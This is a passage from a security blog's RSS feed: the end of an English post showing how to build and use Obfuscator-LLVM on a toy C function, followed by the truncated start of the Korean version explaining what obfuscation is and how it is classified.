&amp;&amp;BeginThenGen = [&amp;D, Device, &amp;Info, &amp;CodeGen, &amp;NoPrivAction](...)</code></pre><ul><li><strong>In</strong> <code>obfuscator/include/llvm/ExecutionEngine/Orc/OrcRemoteTargetClient.h</code> <strong>(line 696):</strong></li></ul><p><code>error: cannot convert</code></p><p>&#x2192; Change the return type from <code>char</code> to <code>uint8_t</code>.</p><pre><code class="hljs c"><span class="hljs-function">Expected&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">char</span>&gt;&gt; <span class="hljs-title">readMem</span><span class="hljs-params">(...)</span> </span>{ ... }&#x2193;<span class="hljs-function">Expected&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">uint8_t</span>&gt;&gt; <span class="hljs-title">readMem</span><span class="hljs-params">(...)</span> </span>{ ... }</code></pre><p><img src="image%209.png" alt="image.png"></p><p>If everything goes well, you should see the custom OLLVM-enabled <code>clang</code> binary built successfully!</p><h3 id="3-2-How-to-Use-OLLVM"><a href="#3-2-How-to-Use-OLLVM" class="headerlink" title="3.2 How to Use OLLVM"></a>3.2 How to Use OLLVM</h3><p>The easiest way to use Obfuscator-LLVM is to pass specific flags to the LLVM backend via Clang using the <code>-mllvm</code> option.</p><p>The main available flags are:</p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Features">https://github.com/obfuscator-llvm/obfuscator/wiki/Features</a></p><ul><li><code>fla</code>: Control Flow Flattening</li><li><code>sub</code>: Instruction Substitution</li><li><code>bcf</code>: Bogus Control Flow</li></ul><p>If you want to apply obfuscation selectively to specific functions, you can also use <a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Functions-annotations">function annotations</a>.</p><h3 id="3-3-Practice"><a href="#3-3-Practice" class="headerlink" title="3.3 Practice"></a>3.3 Practice</h3><p>Let&#x2019;s start with a simple program:</p><pre><code class="hljs c"><span class="hljs-comment">// flatten_example.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">secret_function</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>{    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">0</span>) {        <span class="hljs-keyword">return</span> x * <span class="hljs-number">2</span>;    } <span class="hljs-keyword">else</span> {        <span class="hljs-keyword">return</span> x - <span class="hljs-number">2</span>;    }}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">int</span> value = <span class="hljs-number">5</span>;    <span class="hljs-keyword">int</span> result = secret_function(value);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result: %d\n&quot;</span>, result);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>First, compile it normally and then compile it with obfuscation enabled:</p><pre><code class="hljs bash">$ clang flatten_example.c -o flatten_example_norm$ path_to_the/build/bin/clang -mllvm -fla flatten_example.c -o flatten_example_obf</code></pre><p>Now, let&#x2019;s analyze both binaries using IDA.</p><p>On the left is <code>flatten_example_norm</code>, and on the right is <code>flatten_example_obf</code> .</p><p>Here&#x2019;s the disassembled <code>secret_function</code>:</p><p><img src="image%2010.png" alt="image.png"></p><p>And the control flow graph (CFG) of <code>secret_function</code>:</p><p><img src="image%2011.png" alt="image.png"></p><p>You can already see a stark difference &#x2014; even though the original code was simple!</p><p>Of course, despite all the added complexity, the execution result remains exactly the same:</p><p><img src="image%2012.png" alt="image.png"></p><h2 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="4. Conclusion"></a>4. Conclusion</h2><h3 id="Limitations"><a href="#Limitations" class="headerlink" title="Limitations"></a>Limitations</h3><p>Of course, obfuscation also comes with clear limitations.</p><ul><li><strong>Performance Degradation:</strong> The insertion of unnecessary logic and complex branching during obfuscation can significantly reduce program performance.</li><li><strong>Counterattack by Evolving Tools:</strong> Static analyzers, deobfuscators, and other analysis tools continue to advance, allowing certain obfuscation techniques to be bypassed relatively easily.</li><li><strong>Legal and Ethical Issues:</strong> Applying excessive obfuscation to commercial software can undermine user trust, and in some cases, lead to legal disputes.</li></ul><h3 id="Significance"><a href="#Significance" class="headerlink" title="Significance"></a>Significance</h3><p>As we have seen so far, obfuscation techniques can be broadly categorized into <strong>Structural</strong>, <strong>Data</strong>, and <strong>Algorithmic</strong> aspects based on their working mechanisms. However, in real-world software analysis, these categories are not isolated. In practice, all three aspects are often combined, and furthermore, numerous variants and modifications&#x2014;along with entirely new ideas&#x2014;continue to emerge, making analysis even more complex.</p><p>For example, let&#x2019;s briefly look at the obfuscation techniques used by DJI, a commercial drone company well-known for its heavy obfuscation.</p><ul><li><strong>Structural Obfuscation:</strong> Splitting eight DEX files into 128KB chunks and encrypting each chunk with <strong>AES-256</strong>.</li><li><strong>Data Obfuscation:</strong> Generating an <strong>XOR-based key</strong> by combining the string <code>com.dji.industry.pilot</code> with hardcoded constants.</li><li><strong>Algorithmic Obfuscation:</strong> Redirecting JNI calls through a <strong>three-stage trampoline function</strong> before reaching the actual native function.</li></ul><p>Modern obfuscation technologies no longer rely on single-layer techniques. Instead, they adopt <strong>multi-layered, modular defense systems</strong>, incorporating new variants every year to complicate analysis even further. Some experimental approaches are also emerging, such as using AI-generated fake code patterns or leveraging quantum cryptography for key exchanges&#x2014;highlighting how obfuscation evolves alongside technological advancement.</p><p>As we&#x2019;ve repeatedly discussed in Parts 1, 2, and 3:</p><blockquote><p>&#x201C;Every protection layer is merely a device to buy time &#x2014; it can never guarantee absolute safety.&#x201D;</p><p>&#x2013; Quarkslab Research Team</p></blockquote><p>Obfuscation and anti-debugging techniques are ultimately part of the <strong>ongoing battle to protect code</strong>. In the endless tug-of-war between reverse engineers and developers, technology continues to evolve&#x2014;and through that struggle, the entire field of security moves forward. Obfuscation today is not only crucial for legitimate software protection but also actively used in <strong>malware</strong> to evade detection and delay analysis. It has become a <strong>fundamental technique on both sides</strong> of the attack and defense landscape.</p><p>Obfuscation is a means to <strong>delay attacks and buy time for defense</strong>, but no shield is ever perfect. Analysts will persistently trace the flow and improve their tools, while developers will devise new obfuscation techniques to reinforce their defenses.</p><p><strong>This battle will never end.</strong></p><p>Because as technology evolves, so too will the methods of attack and defense. Rather than seeing obfuscation as merely an obstacle, we should recognize it as <strong>an essential part of the evolutionary process toward a more secure environment</strong>. Even amid the endless clash of spear and shield, our goal remains the same.</p><p><img src="image%2013.png" alt="image.png"></p><blockquote><p>&#x201C;The game goes on. And for our own reasons, we each dive into this never-ending game.&#x201D;</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>&#xB9AC;&#xBC84;&#xC2F1; &#xD575;&#xC2EC; &#xC6D0;&#xB9AC;: &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xC758; &#xB9AC;&#xBC84;&#xC2F1; &#xC774;&#xC57C;&#xAE30;(&#xC800;&#xC790; &#xC774;&#xC2B9;&#xC6D0;)</p><p><a href="https://m.blog.naver.com/choijo2/60196192627">https://m.blog.naver.com/choijo2/60196192627</a></p><p><a href="http://en.wikipedia.org/wiki/Obfuscation_(software">http://en.wikipedia.org/wiki/Obfuscation_(software)</a>)</p><p><a href="https://blog.quarkslab.com/dji-the-art-of-obfuscation.html">https://blog.quarkslab.com/dji-the-art-of-obfuscation.html</a></p><p><a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/">https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/</a></p><p><a href="https://github.com/obfuscator-llvm/obfuscator">https://github.com/obfuscator-llvm/obfuscator</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anti-Debugging/">Anti-Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Reverse-Engineering/">Reverse Engineering</category>
      
      <category domain="https://hackyboiz.github.io/tags/OLLVM/">OLLVM</category>
      
      <category domain="https://hackyboiz.github.io/tags/Obfuscation/">Obfuscation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Anti-Debugging Part 3(KR)</title>
      <link>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/kr/</link>
      <guid>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/kr/</guid>
      <pubDate>Mon, 28 Apr 2025 13:15:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; OUYA77 &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#x1F642;&lt;/p&gt;
&lt;p&gt;&amp;#xB098;&amp;#xC911;&amp;#xC5D0; &amp;#xAE30;&amp;#xD68C;&amp;#xAC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; OUYA77 &#xC785;&#xB2C8;&#xB2E4;. &#x1F642;</p><p>&#xB098;&#xC911;&#xC5D0; &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xBE14;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; &#xB09C;&#xB3C5;&#xD654;&#xB3C4; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xB2E4; &#xD588;&#xB294;&#xB370; &#xB9C8;&#xCE68; &#xAE30;&#xD68C;&#xAC00; &#xB418;&#xC5B4;&#xC11C;(?) &#xC774;&#xB807;&#xAC8C; Part 3&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Part 1&#xC5D0;&#xC11C;&#xB294; &#xB514;&#xBC84;&#xAE45;&#xACFC; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xACE0; Part 2&#xC5D0;&#xC11C;&#xB294; &#x201C;&#xD568;&#xC815;&#xCE74;&#xB4DC;&#x201D;&#xCC98;&#xB7FC; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC774; &#xD2B9;&#xC815; &#xB3D9;&#xC791;&#xC744; &#xB9C9;&#xC73C;&#xB824; &#xD560; &#xB54C; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC778; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45; &#xC6B0;&#xD68C;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>(&#xD639;&#xC2DC; &#xC544;&#xC9C1; &#xBABB;&#xBCF4;&#xC168;&#xB2E4;&#xBA74; &#x1F447; &#x314E;&#x314E;).</p><blockquote><p><em>&#xC9C0;&#xB09C; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</em><br><a href="https://hackyboiz.github.io/2024/12/29/OUYA77/Anti_part1/kr/">[Research] Anti-Debugging Part1(KR)</a><br><a href="https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/kr/">[Research] Anti-Debugging Part2(KR)</a></p></blockquote><p>&#xAE34; &#xD638;&#xD761;&#xC73C;&#xB85C; &#xC774;&#xC57C;&#xAE30;&#xAC00; &#xC804;&#xAC1C;&#xB41C; &#xB9CC;&#xD07C; &#xAE4C;&#xBA39;&#xC73C;&#xC168;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC744;&#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xB294;&#xB370;&#xC694;. &#xD639;&#xC2DC; &#xADF8;&#xB7EC;&#xC168;&#xC744;&#xAE4C;&#xBD10; &#xC81C;&#xAC00; &#xAC04;&#xB2E8;&#xD55C; &#xCE74;&#xD230;(?)&#xC744; &#xC900;&#xBE44;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. <del>&#xB9CC;&#xB4DC;&#xB294;&#xB370; &#xC0AC;&#xC2EC;&#xC740; &#xC808;&#xB300; &#xC11E;&#xC9C0; &#xC54A;&#xC558;&#xC5B4;&#xC694;. &#xB9CC;&#xB4E4;&#xB2E4;&#xAC00; &#xD504;&#xB808;&#xC784;&#xC744; &#xC9DC;&#xB294;&#xAC8C; &#xC5B4;&#xB824;&#xC6CC;&#xC11C; &#xC804;&#xBB38;&#xAC00;&#xB2D8;&#xC758; &#xB3C4;&#xC6C0;&#xC744; &#xBC1B;&#xC740; &#xAC83;&#xB3C4; &#xBE44;&#xBC00;&#xC774;&#xB78D;&#xB2C8;&#xB2E4;.</del></p><h2 id="Anti-Dubbugging-Part-&#xC694;&#xC57D;"><a href="#Anti-Dubbugging-Part-&#xC694;&#xC57D;" class="headerlink" title="Anti-Dubbugging Part &#xC694;&#xC57D;"></a>Anti-Dubbugging Part &#xC694;&#xC57D;</h2><p><img src="image%201.png" alt="image.png"></p><p><img src="image%202.png" alt="image.png"></p><p><img src="image%203.png" alt="image.png"></p><p>&#xC704; &#xCE74;&#xD230;&#xC5D0;&#xC11C;&#xB3C4; &#xBCF4;&#xC168;&#xB2E4;&#xC2DC;&#xD53C; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC774; &#xB098;&#xC654;&#xACE0; &#xADF8;&#xAC78; &#xB610; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; Part 1, 2&#xC5D0; &#xAC78;&#xCCD0;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC758; &#xD55C;&#xACC4;&#xB294; <strong>&#xACB0;&#xAD6D; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC62C;&#xB77C;&#xAC00;&#xC57C; &#xD558;&#xB2E4; &#xBCF4;&#xB2C8;</strong>, &#xADF8;&#xB9AC;&#xACE0; <strong>&#xBD84;&#xC11D;&#xC758; &#xB300;&#xC0C1;&#xC774; &#xB418;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC790;&#xCCB4;&#xAC00; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC8FC;&#xC5B4;&#xC9C0;&#xB2E4; &#xBCF4;&#xB2C8;</strong>, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC758; &#xB85C;&#xC9C1;&#xC744; &#xD30C;&#xC545;&#xD574;&#xC11C; &#xD328;&#xCE58;&#xD558;&#xB294; &#xB4F1;&#xC73C;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xACE0;&#xB4E0; &#xB7A8;&#xC9C0; &#xC120;&#xC0DD;&#xB2D8;&#xC774; &#x201C;&#xC774; &#xC7AC;&#xB8CC;(&#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45; &#xB85C;&#xC9C1;)&#xAC00; &#xBB54;&#xC9C0; &#xBAA8;&#xB974;&#xAC8C; &#xC228;&#xACA8;&#xC57C; &#xD574;!&#x201D; &#xB77C;&#xACE0; &#xBD88;&#xC465; &#xB098;&#xD0C0;&#xB098;&#xC154;&#xC11C; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xB77C;&#xACE0; &#xD558;&#xC2E0; &#xAC70;&#xC8E0;! &#x1F525;&#x1F468;&#x200D;&#x1F373;</p><blockquote><p>In Part 2&#x2026;</p><p><img src="image%204.png" alt="image.png"></p><blockquote><p>???: &#xADF8;&#xB7FC; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB974;&#xAC8C; &#xD558;&#xBA74; &#xB418;&#xC9C0; &#xC54A;&#xB0D0;! / 000: &#xC5B4;&#xB5BB;&#xAC8C;!!</p></blockquote></blockquote><p>&#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC774; &#xAC78;&#xB9B0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC5B4;&#xB5A4; &#xBD80;&#xBD84;&#xC774; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xB85C;&#xC9C1;&#xC778;&#xC9C0; &#xC54C; &#xC218; &#xC5C6;&#xACE0; &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xAC00; &#xB354;&#xC6B1; &#xAE4C;&#xB2E4;&#xB86D;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xBC88; Part 3&#xC5D0;&#xC11C;&#xB294; &#xC774; <strong>&#xB09C;&#xB3C5;&#xD654;</strong>&#xB77C;&#xB294; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xB140;&#xC11D;&#xC744; &#xC9D1;&#xC911;&#xC801;&#xC73C;&#xB85C; &#xD30C;&#xD5E4;&#xCCD0; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="1-&#xB09C;&#xB3C5;&#xD654;-Obfuscation"><a href="#1-&#xB09C;&#xB3C5;&#xD654;-Obfuscation" class="headerlink" title="1. &#xB09C;&#xB3C5;&#xD654;(Obfuscation)"></a>1. &#xB09C;&#xB3C5;&#xD654;(Obfuscation)</h2><h3 id="1-1-&#xC18C;&#xAC1C;"><a href="#1-1-&#xC18C;&#xAC1C;" class="headerlink" title="1.1 &#xC18C;&#xAC1C;"></a>1.1 &#xC18C;&#xAC1C;</h3><ul><li><strong>&#xB09C;&#xB3C5;&#xD654;(Obfuscation)</strong>&#xB780; &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;. Wikipedia&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;:</li></ul><blockquote><p>&#x201C;&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xB09C;&#xB3C5;&#xD654;&#xB780;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC758; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xB610;&#xB294; &#xBA38;&#xC2E0;&#xCF54;&#xB4DC;&#xB97C; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xC5EC; &#xC0AC;&#xB78C; &#xB610;&#xB294; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xAC00; &#xC774;&#xD574;&#xD558;&#xAC70;&#xB098; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xC77C;&#xC774;&#xB2E4;.&#x201D;</p></blockquote><p>&#xC774;&#xB294; &#xB2E8;&#xC21C;&#xD55C; &#xCF54;&#xB4DC; &#xAC00;&#xB3C5;&#xC131; &#xC800;&#xD558;&#xB97C; &#xB118;&#xC5B4;&#xC11C;, <strong>&#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;, &#xB514;&#xBC84;&#xAE45;, &#xC815;&#xC801; &#xBD84;&#xC11D; &#xB4F1;&#xC744; &#xBC29;&#xD574;</strong>&#xD558;&#xACE0;, &#xC9C0;&#xC801; &#xC7AC;&#xC0B0; &#xBCF4;&#xD638;, &#xBCF4;&#xC548; &#xAC15;&#xD654;, &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xD68C;&#xD53C; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xBAA9;&#xC801;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="1-2-&#xBAA9;&#xC801;"><a href="#1-2-&#xBAA9;&#xC801;" class="headerlink" title="1.2 &#xBAA9;&#xC801;"></a>1.2 &#xBAA9;&#xC801;</h3><p>&#xB09C;&#xB3C5;&#xD654;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;&#xC11C;&#xB3C4;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBD84;&#xC11D; &#xBC29;&#xC9C0; &#xBAA9;&#xC801;&#xC744; &#xB2EC;&#xC131;&#xD569;&#xB2C8;&#xB2E4;:</p><ul><li><strong>&#xAC00;&#xB3C5;&#xC131; &#xC800;&#xD558;:</strong> &#xCF54;&#xB4DC;&#xC758; &#xB17C;&#xB9AC; &#xAD6C;&#xC870;&#xC640; &#xC758;&#xBBF8;&#xB97C; &#xC228;&#xACA8; &#xBD84;&#xC11D;&#xC790;&#xC758; &#xC774;&#xD574;&#xB97C; &#xBC29;&#xD574;</li><li><strong>&#xAD6C;&#xC870;&#xC801; &#xBCF5;&#xC7A1;&#xC131; &#xC99D;&#xAC00;:</strong> &#xBD88;&#xD544;&#xC694;&#xD55C; &#xC5F0;&#xC0B0;, &#xBE44;&#xC120;&#xD615;&#xC801; &#xD750;&#xB984;, &#xB09C;&#xC218; &#xAE30;&#xBC18; &#xC870;&#xAC74; &#xB4F1; &#xC0BD;&#xC785;</li><li><strong>&#xD328;&#xD134; &#xD0D0;&#xC9C0; &#xD68C;&#xD53C;:</strong> &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xAE30;&#xBC18; &#xD0D0;&#xC9C0; &#xB3C4;&#xAD6C;&#xC758; &#xC624;&#xD0D0; &#xB610;&#xB294; &#xD0D0;&#xC9C0; &#xD68C;&#xD53C; &#xC720;&#xB3C4;</li></ul><p>&#xADF8;&#xB798;&#xC11C; &#xBD84;&#xC11D;&#xAC00;&#xAC00; &#x201C;&#xC544;~ &#xACE4;&#xB780;&#xD558;&#xB124; ;;&#x201D; &#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5C8;&#xB2E4;&#xBA74; &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xBAA9;&#xC801;&#xC744; &#xC5B4;&#xB290;&#xC815;&#xB3C4; &#xC774;&#xB918;&#xB2E4;&#xACE0; &#xBD10;&#xB3C4; &#xBB34;&#xBC29;&#xD569;&#xB2C8;&#xB2E4;. </p><h3 id="1-3-&#xB09C;&#xB3C5;&#xD654;&#xC758;-&#xBD84;&#xB958;"><a href="#1-3-&#xB09C;&#xB3C5;&#xD654;&#xC758;-&#xBD84;&#xB958;" class="headerlink" title="1.3 &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xBD84;&#xB958;"></a>1.3 &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xBD84;&#xB958;</h3><p>&#xB09C;&#xB3C5;&#xD654;&#xB294; &#xD06C;&#xAC8C; &#xB450; &#xAC00;&#xC9C0; &#xBC94;&#xC8FC;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>&#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xB09C;&#xB3C5;&#xD654; (Source Code Obfuscation)</strong></li></ol><ul><li><strong>&#xC801;&#xC6A9; &#xB300;&#xC0C1;</strong>: &#xC0AC;&#xB78C;&#xC774; &#xC791;&#xC131;&#xD55C; &#xACE0;&#xC218;&#xC900; &#xC5B8;&#xC5B4; (Java, JavaScript, Python &#xB4F1;)</li><li><strong>&#xC801;&#xC6A9; &#xC2DC;&#xC810;</strong>: &#xCEF4;&#xD30C;&#xC77C; &#xC774;&#xC804;</li><li><strong>&#xBAA9;&#xC801;</strong>: &#xB0B4;&#xBD80; &#xBCF4;&#xC548; &#xD655;&#xBCF4;, &#xC678;&#xC8FC;/&#xACE0;&#xAC1D;&#xC6A9; &#xCF54;&#xB4DC; &#xC77C;&#xBD80; &#xACF5;&#xAC1C; &#xC2DC; &#xD50C;&#xB85C;&#xC6B0; &#xBCF4;&#xD638;</li></ul><p>&#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xC885;&#xC885; &#xB0B4;&#xBD80; &#xB610;&#xB294; &#xACE0;&#xAC1D;&#xC5D0;&#xAC8C; &#xC18C;&#xC2A4; &#xC77C;&#xBD80;&#xB97C; &#xACF5;&#xAC1C;&#xD574;&#xC57C; &#xD560; &#xACBD;&#xC6B0;, &#xC804;&#xCCB4; &#xB85C;&#xC9C1;&#xC774;&#xB098; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC720;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xB294; &#xC0AC;&#xB78C;&#xC740; &#xC77C;&#xBD80; &#xC218;&#xC815;&#xC740; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC;, &#xC804;&#xCCB4; &#xAD6C;&#xC870;&#xB098; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC; &#xAE30;&#xBC95;&#xC73C;&#xB85C;&#xB294; &#x201C;&#xC2DD;&#xBCC4;&#xC790; &#xC774;&#xB984; &#xBCC0;&#xACBD;&#x201D;, &#x201C;&#xCF54;&#xB4DC; &#xBE14;&#xB85D; &#xC7AC;&#xBC30;&#xC5F4;&#x201D;, &#x201C;&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xB09C;&#xB3C5;&#xD654;&#x201D;, &#x201C;&#xBB38;&#xC790;&#xC5F4; &#xC778;&#xCF54;&#xB529;&#x201D;&#xC744; &#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654; (Binary Obfuscation)</strong></li></ol><ul><li><strong>&#xC801;&#xC6A9; &#xB300;&#xC0C1;</strong>: &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xC2E4;&#xD589;&#xD30C;&#xC77C; (C, C++, Go &#xB4F1;)</li><li><strong>&#xC801;&#xC6A9; &#xC2DC;&#xC810;</strong>: &#xCEF4;&#xD30C;&#xC77C; &#xC2DC; &#xD639;&#xC740; &#xC774;&#xD6C4; &#xBCC0;&#xD615;</li><li><strong>&#xBAA9;&#xC801;</strong>: &#xC81C;&#xD488; &#xBCF4;&#xD638;, &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xC720;&#xCD9C; &#xBC29;&#xC9C0;, &#xD06C;&#xB799;/&#xB9AC;&#xBC84;&#xC2F1; &#xBC29;&#xC9C0;</li></ul><p>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xB294; <strong>&#xC2E4;&#xC81C; &#xBC30;&#xD3EC;&#xB418;&#xB294; &#xC81C;&#xD488; &#xBCF4;&#xD638;&#xC758; &#xD575;&#xC2EC;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC0C1;&#xC6A9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; &#xB300;&#xBD80;&#xBD84; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD615;&#xD0DC;&#xB85C; &#xBC30;&#xD3EC;&#xB418;&#xBA70;, &#xC774; &#xC548;&#xC5D0;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;, &#xB77C;&#xC774;&#xC120;&#xC2A4; &#xB85C;&#xC9C1;, &#xC778;&#xC99D; &#xCCB4;&#xACC4; &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;, &#xACF5;&#xACA9;&#xC790;&#xB098; &#xACE0;&#xAC1D;&#xC774; &#xC774;&#xB97C; 